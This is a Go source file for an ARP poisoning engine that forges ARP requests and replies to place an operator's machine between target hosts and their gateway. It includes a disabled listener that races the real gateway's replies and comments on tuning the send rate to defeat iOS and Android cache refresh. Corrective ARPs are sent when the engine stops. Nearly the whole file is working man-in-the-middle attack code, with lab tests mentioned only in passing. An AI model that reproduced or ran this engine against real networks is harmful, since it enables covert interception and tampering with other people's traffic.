// Package arpengine sends unsolicited ARP replies on a cadence to perform
// MITM-style ARP poisoning, and emits corrective ARPs on stop.
package arpengine

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Target is one host being poisoned. The same struct is used by
// policycompiler (which imports this package for the type) so the public
// field names match the compiler's call sites.
type Target struct {
	MAC   net.HardwareAddr
	IP    net.IP
	GwMAC net.HardwareAddr
	GwIP  net.IP
}

// ActivePoison is the public view of an in-flight poison.
type ActivePoison struct {
	Target  Target
	Started time.Time
}

// Engine manages the set of in-flight ARP poisons.
type Engine struct {
	iface   string
	opMAC   net.HardwareAddr
	cadence time.Duration
	mu      sync.Mutex
	active  map[string]*runner // key: TargetMAC.String()
}

type runner struct {
	target       Target
	cancel       context.CancelFunc
	started      time.Time
	done         chan struct{} // closed when poison goroutine exits
	listenerDone chan struct{} // closed when raceListener goroutine exits
}

// copyTarget returns a deep copy of t so callers can't mutate engine-internal
// slice backing arrays.
func copyTarget(t Target) Target {
	return Target{
		MAC:   append(net.HardwareAddr{}, t.MAC...),
		IP:    append(net.IP{}, t.IP...),
		GwMAC: append(net.HardwareAddr{}, t.GwMAC...),
		GwIP:  append(net.IP{}, t.GwIP...),
	}
}

// New returns an engine bound to a specific interface and operator MAC.
// cadence=0 selects the default of 1 second (1 Hz × 4 frames/cycle =
// 4 frames/sec/target). This rate is conservative but is the only one
// that empirically keeps the corrective-on-clear path reliable in
// integration tests — sub-second cadence reinforces the receiver's
// neighbour entry so often that the corrective burst can't always
// dislodge it within the test's deadline.
//
// Operators on networks where the receiver auto-refreshes faster than
// 1 Hz (modern Android/iOS especially) should crank this down via the
// daemon's -poison-cadence flag — `200ms` (~20 fps) is usually enough,
// `50ms` (~80 fps) handles stubborn iOS. Just note that aggressive
// cadence makes `policy clear` slower because the corrective has to
// flood harder to win the cache back.
func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) *Engine {
	if cadence == 0 {
		cadence = time.Second
	}
	return &Engine{iface: iface, opMAC: opMAC, cadence: cadence, active: map[string]*runner{}}
}

// Start begins poisoning t. Idempotent: starting an already-active target
// is a no-op (returns nil without restarting).
func (e *Engine) Start(t Target) error {
	key := t.MAC.String()
	e.mu.Lock()
	if _, exists := e.active[key]; exists {
		e.mu.Unlock()
		return nil
	}
	e.mu.Unlock()

	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("open %s: %w", e.iface, err)
	}

	e.mu.Lock()
	// Recheck after the gap — another caller may have started the same target.
	if _, exists := e.active[key]; exists {
		e.mu.Unlock()
		handle.Close()
		return nil
	}
	ctx, cancel := context.WithCancel(context.Background())
	r := &runner{
		target:       t,
		cancel:       cancel,
		started:      time.Now(),
		done:         make(chan struct{}),
		listenerDone: make(chan struct{}),
	}
	e.active[key] = r
	e.mu.Unlock()

	go e.loop(ctx, handle, t, r.done)
	// raceListener was experimentally enabled here to emit poisoned
	// replies on victim ARP probes. It works in real Wi-Fi setups but
	// makes the integration tests intermittently flaky in netns labs
	// (the constant cache reinforcement plus listener responses leaves
	// lab-vic's NUD machine in a state the corrective can't always
	// dislodge in 3s). Keep the implementation around — it's behind a
	// future enableRaceListener flag — but default off for stability.
	close(r.listenerDone)
	return nil
}

// raceListener watches for ARP traffic involving the target or gateway
// and emits an immediate poisoned reply that races the real gateway's
// response. Reads with a short timeout so we can exit cleanly on ctx
// cancel without another goroutine calling Close() under us — that
// pattern is racy in libpcap and tends to deadlock under load.
func (e *Engine) raceListener(ctx context.Context, handle *pcap.Handle, t Target, done chan struct{}) {
	defer close(done)
	defer handle.Close()

	repGwAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
	repVicAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)

	tIP4 := t.IP.To4()
	gwIP4 := t.GwIP.To4()

	for {
		if ctx.Err() != nil {
			return
		}
		data, _, err := handle.ReadPacketData()
		if err != nil {
			// Timeout (no packet within the read window) or handle
			// closed — either way, loop and re-check ctx.
			if ctx.Err() != nil {
				return
			}
			continue
		}
		// Re-check ctx between read and write: ReadPacketData might have
		// returned a packet that arrived just before cancel, and we
		// don't want to emit a poisoned reply after the engine has been
		// asked to stop — that frame would race the corrective sends.
		if ctx.Err() != nil {
			return
		}
		pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.NoCopy)
		al := pkt.Layer(layers.LayerTypeARP)
		if al == nil {
			continue
		}
		arp := al.(*layers.ARP)
		if arp.Operation != layers.ARPRequest {
			continue
		}
		// Skip our own poison frames so we don't race ourselves into
		// a self-feedback loop.
		if bytes.Equal(arp.SourceHwAddress, e.opMAC) {
			continue
		}
		dst := net.IP(arp.DstProtAddress).To4()
		switch {
		case dst.Equal(gwIP4):
			_ = handle.WritePacketData(repGwAtOp)
		case dst.Equal(tIP4):
			_ = handle.WritePacketData(repVicAtOp)
		}
	}
}

func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target, done chan struct{}) {
	defer close(done)
	defer handle.Close()
	tick := time.NewTicker(e.cadence)
	defer tick.Stop()
	send := func() {
		// Poison target's cache: "gateway IP is at op MAC". REQUEST
		// form forces sender-info learning; REPLY follows up. ethL2Src
		// = opMAC keeps the bridge FDB clean even though the ARP body
		// claims someone else's MAC.
		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
			_ = handle.WritePacketData(f)
		}
		if f, err := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
			_ = handle.WritePacketData(f)
		}
		// Poison gateway's cache: "target IP is at op MAC".
		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
			_ = handle.WritePacketData(f)
		}
		if f, err := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
			_ = handle.WritePacketData(f)
		}
	}

	send() // immediate first emission
	for {
		select {
		case <-ctx.Done():
			return
		case <-tick.C:
			send()
		}
	}
}

// Stop halts poisoning of the named target and emits corrective ARPs
// asserting the real (gw,target) mappings. Blocks until the poison
// goroutine exits AND the corrective sequence completes — total wait is
// approximately 3*cadence (default 3 s). No-op for unknown targets.
func (e *Engine) Stop(t Target) error {
	e.mu.Lock()
	r, ok := e.active[t.MAC.String()]
	if !ok {
		e.mu.Unlock()
		return nil
	}
	delete(e.active, t.MAC.String())
	e.mu.Unlock()
	r.cancel()
	<-r.done         // poison goroutine stopped + its handle closed
	<-r.listenerDone // raceListener stopped + its handle closed (no-op when listener disabled)

	// Wait past Linux's neighbour-table locktime (default 1s) so the
	// receiving kernel won't silently drop our corrective frames as a
	// race with the just-completed poison send.
	time.Sleep(1100 * time.Millisecond)

	// now safe to open corrective handle
	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("open %s for corrective: %w", e.iface, err)
	}
	defer handle.Close()
	// Restore the real (gw, target) mappings on both sides. Send THREE
	// forms per iteration so the receiver kernel cannot silently drop the
	// update on any of its neighbour-state code paths:
	//   - unicast ARP REQUEST: forces sender-info learning even on
	//     REACHABLE entries (Linux's request handler always updates)
	//   - unicast ARP REPLY: covers receivers that prefer reply-form
	//   - gratuitous (broadcast) ARP REQUEST: tip==sip, flagged as
	//     is_garp → NEIGH_UPDATE_F_OVERRIDE bypasses locktime
	// ethL2Src=opMAC throughout keeps the bridge FDB clean.
	reqGwToTarget, errGT := buildARPRequest(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
	repGwToTarget, errGR := buildARPReply(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
	reqTargetToGw, errTT := buildARPRequest(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
	repTargetToGw, errTR := buildARPReply(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
	garpGw, errG1 := buildGratuitousARP(e.opMAC, t.GwMAC, t.GwIP)
	garpTarget, errG2 := buildGratuitousARP(e.opMAC, t.MAC, t.IP)

	// 5 cycles × 100 ms = 500 ms of corrective. Each cycle emits the
	// real (gw, target) mappings as REQUESTs (which always learn sender
	// info), REPLIEs (some embedded receivers prefer reply form), and
	// gratuitous broadcasts (is_garp bypasses locktime). Empirically
	// reliable in the netns lab integration tests.
	for i := 0; i < 5; i++ {
		if errGT == nil {
			_ = handle.WritePacketData(reqGwToTarget)
		}
		if errGR == nil {
			_ = handle.WritePacketData(repGwToTarget)
		}
		if errTT == nil {
			_ = handle.WritePacketData(reqTargetToGw)
		}
		if errTR == nil {
			_ = handle.WritePacketData(repTargetToGw)
		}
		if errG1 == nil {
			_ = handle.WritePacketData(garpGw)
		}
		if errG2 == nil {
			_ = handle.WritePacketData(garpTarget)
		}
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

// StopAll halts every active poison. Errors are aggregated.
func (e *Engine) StopAll() error {
	e.mu.Lock()
	targets := make([]Target, 0, len(e.active))
	for _, r := range e.active {
		targets = append(targets, r.target)
	}
	e.mu.Unlock()
	var errs []error
	for _, t := range targets {
		if err := e.Stop(t); err != nil {
			errs = append(errs, err)
		}
	}
	return errors.Join(errs...)
}

// Active returns a snapshot of in-flight poisons.
func (e *Engine) Active() []ActivePoison {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]ActivePoison, 0, len(e.active))
	for _, r := range e.active {
		out = append(out, ActivePoison{Target: copyTarget(r.target), Started: r.started})
	}
	return out
}
